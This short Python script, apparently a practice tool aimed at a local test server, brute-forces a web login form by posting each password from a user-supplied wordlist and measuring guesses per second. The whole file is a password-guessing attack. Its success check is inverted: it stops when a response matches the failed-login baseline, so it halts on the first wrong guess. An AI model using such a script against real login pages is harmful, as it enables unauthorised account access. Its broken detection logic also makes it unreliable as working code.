from os import EX_DATAERR
from typing import Text
import requests
import time
from requests.auth import HTTPBasicAuth

count = 0

username = input("enter the username you want to login with: ")
wordlist = input("enter the wordlist you need to look into: ")
url = 'http://127.0.0.1:8000/login.html'
t1_b = time.time()
file = open(wordlist, 'r', encoding="ISO-8859-1")
words = file.read().splitlines()
payloaad = {'uname' : 'abc' ,'pword' : 'abc'}
response1 = requests.post(url,payloaad)
for x in words:
    pword = x
    payload = {'uname' : username ,'pword' : pword}
    count += 1
    response = requests.post(url,payload)
    if (response.text == response1.text):
        t2_e = time.time()
        total_time = t2_e - t1_b
        gps = count/total_time
        print("no. of tries ",count)
        print("total time in seconds is ",int(total_time))
        print("no. of guesses per second is ",int(gps))
        break